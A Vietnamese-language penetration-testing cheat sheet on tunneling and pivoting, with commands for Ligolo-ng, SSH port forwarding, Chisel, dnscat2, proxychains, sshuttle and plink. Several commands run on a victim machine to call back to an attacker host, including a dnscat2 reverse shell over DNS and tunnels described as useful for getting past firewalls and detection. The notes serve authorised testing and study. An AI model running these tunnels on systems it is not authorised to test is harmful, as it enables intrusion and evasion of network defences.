# Tunneling

## Ligolo-ng

Ligolo-ng là công cụ giúp quản lý tunnel và pivoting dễ dàng hơn, sử dụng giao diện TUN cho kết nối TCP/TLS ngược

### Cấu hình trên Linux (Kali)

Khởi động proxy với cấu hình:

```bash
ligolo-proxy -selfcert
```

Tạo giao diện TUN:

```bash
sudo ip tuntap add user titans mode tun ligolo
sudo ip link set ligolo up
```

Chạy proxy với chứng chỉ tự ký:

```bash
ligolo-proxy -selfcert
```

### Cấu hình trên Windows (Agent)

Kết nối tới proxy trên Kali, bỏ qua kiểm tra chứng chỉ:

```powershell
.\agent.exe -connect <kali-ip>:11601 -ignore-cert
```

### Khởi động Tunnel (Kali)

Kiểm tra giao diện mạng:

```
[Agent : NT AUTHORITY\SYSTEM@MS01] » ifconfig
```

Thêm Route:

```bash
sudo ip route add 10.10.x.0/24 dev ligolo
```

Khởi động Tunnel:

```
[Agent : NT AUTHORITY\SYSTEM@MS01] » start --tun ligolo
```

### Chuyển tiếp Cổng (Port Forwarding)

Thêm Port Fowarding:

{% code overflow="wrap" %}

```
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 --tcp
```

{% endcode %}

Kiểm tra listener:

```
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_list
```

Dừng Port Fowarding:

```
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_stop 0
```

## SSH Tunneling

SSH tunneling sử dụng giao thức SSH để tạo đường hầm mã hóa, chuyển tiếp lưu lượng giữa máy cục bộ (local), máy trung gian (SSH server) và máy từ xa (remote).

* Local = mình mở port lắng nghe (client mở cổng)
* Remote = target mở port lắng nghe (server mở cổng)
* Dynamic = dạng SOCKS proxy, đi được nhiều nơi, không cố định IP:port
* Remote + Dynamic = giống proxy ngược, cực hữu ích khi firewall chặn toàn bộ inbound

<table data-header-hidden data-full-width="false"><thead><tr><th width="128" align="center">Thước tính / Loại</th><th width="153" align="center">Local Port Forwarding (-L)</th><th width="151" align="center">Dynamic Port (-D)</th><th width="158" align="center">Remote Port (-R)</th><th width="150" align="center">Remote Dynamic (-R)</th></tr></thead><tbody><tr><td align="center">Loại</td><td align="center">Local</td><td align="center">Dynamic</td><td align="center">Remote</td><td align="center">Remote Dynamic</td></tr><tr><td align="center">Kết nối SSH</td><td align="center">Kali -> Target</td><td align="center">Kali -> Target</td><td align="center">Target -> Kali </td><td align="center">Target -> Kali </td></tr><tr><td align="center">Listening Port</td><td align="center">SSH client (Kali)</td><td align="center">SSH client (Kali)</td><td align="center">SSH server (Kali)</td><td align="center">SSH server (Kali) </td></tr><tr><td align="center"><p>Gửi gói </p><p>đến đích</p></td><td align="center">SSH server (Target)</td><td align="center">SSH server (Target)</td><td align="center">SSH client (Target)</td><td align="center">SSH client (Target)</td></tr><tr><td align="center">Mục tiêu forwarding</td><td align="center">Mở IP:Port cụ thể</td><td align="center">Nhiều IP:Port</td><td align="center">Mở IP:Port cụ thể</td><td align="center">Nhiều IP:Port</td></tr><tr><td align="center">Lệnh thực thi</td><td align="center">ssh -L 2345:target:5432 user@target</td><td align="center">ssh -D 9999 user@target</td><td align="center">ssh -R 2345:target:5432 user@attacker</td><td align="center">ssh -R 9999 user@attacker</td></tr><tr><td align="center">Khi nào dùng</td><td align="center">Khi Kali muốn truy cập 1 dịch vụ trên target qua host/port qua</td><td align="center">Khi Kali cần truy cập nhiều dịch vụ trên target - cần reverse</td><td align="center">Khi không bind được cổng trên target - cần reverse</td><td align="center">Khi cần SOCKS proxy ngược từ target -> Kali</td></tr></tbody></table>

***

### Local Port Forwarding

Chuyển tiếp cổng cục bộ đến dịch vụ từ xa qua SSH server, cho phép truy cập dịch vụ từ xa như thể chạy cục bộ.

**Cú pháp**:

```bash
ssh -N -L [bind_address:]<local_port>:<remote_ip>:<remote_port> <user>@<ssh_server_ip>
```

* `-N`: Không thực thi lệnh từ xa, chỉ tạo tunnel.
* `bind_address`: (Tùy chọn) Giao diện lắng nghe, mặc định `127.0.0.1`. Sử dụng `0.0.0.0` để cho phép máy khác truy cập.

**Ví dụ**:

```bash
ssh -N -L 9999:127.0.0.1:8080 ubuntu@192.168.1.20
```

* Chuyển tiếp cổng `9999` trên máy cục bộ (Kali) đến `127.0.0.1:8080` trên máy SSH server (Ubuntu).
* Truy cập `http://localhost:9999` trên Kali để tương tác với dịch vụ `127.0.0.1:8080` trên Ubuntu.

{% hint style="info" %}
Thêm `0.0.0.0:9999` để máy khác trong mạng truy cập được.
{% endhint %}

***

### Remote Port Forwarding

Cho phép dịch vụ cục bộ được truy cập từ máy từ xa qua SSH server.

**Cú pháp**:

```bash
ssh -N -R [bind_address:]<remote_port>:<local_ip>:<local_port> <user>@<ssh_server_ip>
```

* `bind_address`: (Tùy chọn) Giao diện trên SSH server, mặc định `127.0.0.1`.

**Ví dụ**:

```bash
ssh -N -R 9999:127.0.0.1:8080 kali@192.168.1.10
```

* Chuyển tiếp cổng `9999` trên máy SSH server (Kali) đến `127.0.0.1:8080` trên máy cục bộ (nạn nhân).
* Truy cập `http://localhost:9999` trên Kali để tương tác với dịch vụ `127.0.0.1:8080` trên nạn nhân.

{% hint style="info" %}
Cần bật `GatewayPorts clientspecified` trong `/etc/ssh/sshd_config` trên SSH server và khởi động lại dịch vụ (`sudo systemctl restart sshd`) để cho phép truy cập công khai.
{% endhint %}

***

### Dynamic Port Forwarding

Tạo SOCKS proxy trên máy cục bộ, cho phép chuyển tiếp linh hoạt đến nhiều đích qua SSH server.

**Cú pháp**:

```bash
ssh -N -D <local_port> <user>@<ssh_server_ip>
```

**Ví dụ**:

```bash
ssh -N -D 1080 ubuntu@192.168.1.20
```

* Tạo SOCKS proxy tại `127.0.0.1:1080` trên máy cục bộ (Kali).
* Cấu hình trình duyệt hoặc công cụ (như `curl`) để sử dụng proxy:

  ```bash
  curl --socks5-hostname 127.0.0.1:1080 http://127.0.0.1:8080
  ```

***

### Remote Dynamic Port Forwarding

Kết hợp Remote và Dynamic Port Forwarding, tạo SOCKS proxy ngược trên SSH server.

**Cú pháp**:

```bash
ssh -N -R <remote_port> <user>@<ssh_server_ip>
```

**Ví dụ**:

```bash
ssh -N -R 9998 kali@192.168.1.10
```

* Tạo SOCKS proxy tại cổng `9998` trên máy SSH server (Kali).
* Truy cập proxy từ Kali để tương tác với các dịch vụ trên máy cục bộ (nạn nhân).

{% hint style="info" %}
Cần cấu hình `GatewayPorts clientspecified` tương tự Remote Port Forwarding.
{% endhint %}

***

## HTTP Tunneling (với Chisel)

Sử dụng WebSocket qua Chisel để tạo đường hầm HTTP, mã hóa bằng SSH, hiệu quả khi vượt Deep Packet Inspection (DPI).

#### 1. Chisel Server (trên máy Kali)

**Cú pháp**:

```bash
./chisel server -p <port> --reverse
```

**Ví dụ**:

```bash
./chisel server -p 8888 --reverse
```

* Lắng nghe trên cổng `8080`, hỗ trợ reverse tunneling.

#### 2. Chisel Client (trên máy Target)

**Cú pháp**:

```bash
./chisel client <kali_ip>:<port> R:<remote_port>:<local_ip>:<local_port>
```

{% hint style="info" %}
Chạy client ở chế độ nền: `R:socks > /dev/null 2>&1 &`.
{% endhint %}

**Ví dụ**:

```bash
./chisel client 192.168.1.10:8888 R:9999:127.0.0.1:8000
```

* Tạo reverse tunnel từ cổng `9999` trên Kali đến `127.0.0.1:8000` trên Target.

{% hint style="info" %}
Nếu Target dùng hệ điều hành cũ (thiếu glibc 2.32/2.34), sử dụng Chisel build bằng Go 1.19.
{% endhint %}

***

## DNS Tunneling (với dnscat2)

Sử dụng giao thức DNS để truyền dữ liệu, hữu ích khi các cổng khác bị chặn.

#### 1. dnscat2 Server (trên máy Kali)

**Cú pháp**:

```bash
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53 --secret=<secret> --no-cache
```

**Ví dụ**:

```bash
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53 --secret=mysecret --no-cache
```

* Lắng nghe trên cổng `53`, sử dụng `mysecret` để mã hóa.

#### 2. dnscat2 Client (trên máy Target)

**Cú pháp**:

```bash
./dnscat --dns server=<kali_ip>,port=53 --secret=<secret>
```

**Ví dụ**:

```bash
./dnscat --dns server=192.168.1.10,port=53 --secret=mysecret
```

* Kết nối đến server và tạo shell ngược.

#### **3. Tạo Shell Ngược (trên server)**:

```bash
session -i 1
shell
```

{% hint style="info" %}
DNS tunneling chậm nhưng khó phát hiện.
{% endhint %}

***

## Các công cụ hỗ trợ

### Proxychains

Định tuyến lưu lượng TCP qua SOCKS proxy (thường từ Dynamic Port Forwarding).

#### 1. Cấu hình Proxychains

**File cấu hình**: `/etc/proxychains4.conf`

**Nội dung ví dụ**:

```conf
quiet_mode
socks5 127.0.0.1 9999
```

#### 2. Chạy lệnh với Proxychains

**Cú pháp**:

```bash
proxychains4 <command>
```

**Ví dụ**:

```bash
proxychains4 nmap -sT 192.168.1.100
```

* Quét `192.168.1.100` qua SOCKS proxy tại `127.0.0.1:9999`.

{% hint style="info" %}
Proxychains chỉ hỗ trợ TCP, không hỗ trợ UDP.
{% endhint %}

***

### Sshuttle

Biến kết nối SSH thành VPN đơn giản (Client-to-Site VPN).

**Cú pháp**:

```bash
sudo sshuttle -r <user>@<target_ip>:<port> <destination>
```

**Ví dụ**:

```bash
sudo sshuttle -r ubuntu@192.168.1.100:22 127.0.0.1/32
```

* Chuyển tiếp lưu lượng đến `127.0.0.1` trên máy SSH server (Ubuntu).
* Sử dụng `0/0` để route toàn bộ IPv4 traffic.

**Điều kiện**:

* Máy client (Kali) cần quyền `sudo`.
* Máy SSH server cần Python 3.

***

### Plink (Windows)

Tunneling trên Windows qua SSH sử dụng `plink.exe`.

**Cú pháp**:

{% code overflow="wrap" %}

```cmd
plink.exe -ssh -l <user> -pw <password> -R <remote_ip>:<remote_port>:<local_ip>:<local_port> <ssh_server_ip>
```

{% endcode %}

**Ví dụ**:

{% code overflow="wrap" %}

```cmd
cmd.exe /c echo y | plink.exe -ssh -l kali -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.1.10
```

{% endcode %}

* Chuyển tiếp cổng `9833` trên Kali đến `127.0.0.1:3389` (RDP) trên máy Windows.
* `echo y`: Tự động chấp nhận SSH key.

***
